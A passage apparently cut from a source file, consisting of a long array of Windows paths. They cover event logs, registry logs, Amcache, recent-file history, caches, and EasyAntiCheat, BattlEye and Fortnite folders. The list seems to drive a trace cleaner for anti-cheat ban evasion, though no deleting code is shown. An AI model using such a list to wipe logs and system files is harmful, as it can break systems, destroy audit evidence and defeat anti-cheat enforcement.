            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\$resumeData",
            "C:\\Program Files\\rempl\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs",
            "C:\\Windows\\System32\\LogFiles\\WMI",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository",
            "C:\\Windows\\appcompat\\appraiser\\AltData",
            "C:\\Windows\\Logs\\CBS",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\Windows\\SysWOW64\\Gms.log",
            "C:\\Windows\\System32\\WDI\\LogFiles\\StartupInfo",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.XboxGameOverlay_1.42.4001.0_x64__8wekyb3d8bbwe",
            "C:\\Windows\\Logs\\MoSetup\\UpdateAgent.log",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs",
            "systemdrive%\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\settings",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\ProgramData\\Microsoft\\XboxLive\\NSALCache",
            "C:\\Program Files x86\\AMD\\CNext\\CCCSlim",
            "C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache",
            "C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules",
            "C:\\Program Files x86\\Common Files\\BattlEye\\BEDaisy.sys",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\Videos\\Captures\\desktop.ini",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\XboxLive\\NSALCache",
            "C:\\Windows\\System32\\WDI\\LogFiles\\StartupInfo",
            "C:\\Windows\\SysWOW64\\Gms.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.ZuneVideo_8wekyb3d8bbwe",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\EasyAntiCheat",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\Unistore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.db-wal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.db",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\GatherLogs",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Windows\\qwavecache.dat",
            "C:\\MSOCache",
            "C:\\$RECYCLE.BIN",
            "C:\\Recovery",
            "C:\\Recovery\\ntuser.sys",
            "C:\\System Volume Information",
            "C:\\Users\\Public\\Shared Files",
            "C:\\Users\\Public\\Shared Files.sys",
            "C:\\Users\\Public\\Libraries\\collection.dat",
            "C:\\ProgramData\\regid.1991-06.com.microsoft",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\D3DSCache",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Packages\\microsoft.windows.fontdrvhost\\AC",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\PenWorkspace\\DiscoverCacheData.dat",
            "C:\\Windows\\SoftwareDistribution",
            "C:\\Windows\\SoftwareDistribution\\SLS",
            "C:\\Windows\\Logs\\SIH",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\ReactNativeBundle.bin",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\dtlscert.der",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\dtlskey.der",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\SkypeRT\\persistent.tmp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\slimcore-aria-cache.data-shm",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\slimcore-aria-cache.data-wal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\slimcore-aria-cache.data-journal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\AsyncStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC\\Microsoft",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\CS_localstate\\CS_shared.conf",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\CS_localstate",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\shared.xml",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\shared.lck",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC\\INetCache\\container.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC\\INetCookies\\ESE\\container.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\TempState\\VimTemp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalCache\\RNManualFileCache",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edb0003A.jtx",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edbtmp.jtx",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\History",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.IE5",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Notifications",
            "C:\\ProgramData\\Microsoft\\Windows\\wfp\\currentState.xml",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.MicrosoftEdge_44.17763.1.0_neutral__8wekyb3d8bbwe",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\Windows",
            "C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\microsoft.system.package.metadata\\Autogen",
            "C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\microsoft.system.package.metadata\\Autogen\\JSByteCodeCache_64",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.Cortana_1.11.5.17763_neutral_neutral_cw5n1h2txyewy",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5\\container.dat",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jtx",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edb0001C.jtx",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\GatherLogs",
            "C:\\Windows\\System32\\config\\BBI.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\CrashDumps",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC\\Temp\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\DiagOutputDir",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\Settings\\settings.dat.LOG2",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.WindowsAlarms_10.1903.1006.0_x64__8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.WindowsAlarms_10.1903.1006.0_neutral_split.scale-100_8wekyb3d8bbwe",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\Settings",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\TempState",
            "C:\\Program Files\\WindowsApps\\Microsoft.WindowsAlarms_10.1903.1006.0_x64__8wekyb3d8bbwe\\microsoft.system.package.metadata",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.language-de_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.scale-100_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\TempState",
            "C:\\Program Files\\WindowsApps\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe\\microsoft.system.package.metadata",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Settings",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\InputApp_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\InputApp_cw5n1h2txyewy\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\InputApp_cw5n1h2txyewy\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\InputApp_cw5n1h2txyewy\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\InputApp_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\CrashDumps",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-AppReadiness%4Admin.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-AppReadiness%4Operational.evtx",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.SkypeApp_14.48.51.0_x64__kzf8qxf38zg5c",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC",
            "C:\\ProgramData\\Microsoft\\Network\\Downloader",
            "C:\\ProgramData\\Microsoft\\Network",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.WindowsStore_11905.1001.4.0_neutral_split.scale-100_8wekyb3d8bbwe",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Logs",
            "C:\\Windows\\TEMP\\NVIDIA Corporation",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\D3DSCache",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\Caches",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC",
            "C:\\Program Files\\UNP\\UpdateNotificationMgr",
            "C:\\Program Files\\UNP\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Safety\\edge\\local\\local\\cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Safety\\edge\\remote",
            "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\CLR_v4.0_32\\UsageLogs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VisualStudio\\Packages\\_Channels",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VisualStudio\\Packages\\_Instances",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VSApplicationInsights",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd-wal",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.WindowsStore_11905.1001.4.0_x64__8wekyb3d8bbwe",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\AC",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Flighting\\OneSettings\\RefreshCache",
            "C:\\ProgramData\\USOPrivate\\UpdateStore",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateOrchestrator",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-wal",
            "C:\\Program Files\\WindowsApps\\Microsoft.SkypeApp_14.48.51.0_x64__kzf8qxf38zg5c\\microsoft.system.package.metadata",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\Settings",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\LocalState",
            "C:\\Program Files\\WindowsApps\\Microsoft.WindowsStore_11905.1001.4.0_x64__8wekyb3d8bbwe\\microsoft.system.package.metadata",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Windows\\System32\\config\\SYSTEM.LOG1",
            "C:\\Windows\\System32\\config\\SOFTWARE.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\CLR_v4.0_32\\UsageLogs",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Windows\\qwavecache.dat",
            "C:\\Users\\"+ user +"\\ntuser.ini",
            "C:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat",
            "C:\\MSOCache\\{71230000-00E2-0000-1000-00000000}",
            "C:\\Users\\Public\\Shared Files",
            "C:\\Recovery\\ntuser.sys",
            "C:\\Recovery",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue",
            "C:\\Users\\Public\\Libraries",
            "C:\\Users\\Public",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\SharedCacheContainers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\DOMStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Caches",
            "C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrccache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd-shm",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\AppCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\Internet Explorer\\DOMStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\TokenBroker\\Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\BackgroundTransferApi",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\Indexed DB",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Windows\\appcompat\\Programs",
            "C:\\Windows\\System32\\config\\BBI.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\CacheStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\CLR_v4.0_32\\UsageLogs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\ThumbCacheToDelete",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Cloud",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\InstallAgent\\Checkpoints",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Spelling",
            "C:\\Windows\\System32\\catroot2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\CrashDumps",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-wal",
            "C:\\Windows\\AppReadiness",
            "C:\\ProgramData\\Intel",
            "C:\\ProgramData\\Intel\\ShaderCache",
            "C:\\Windows\\System32\\eac_usermode_11511826802397.dll",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\EasyAntiCheat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\Settings\\settings.dat.LOG1",
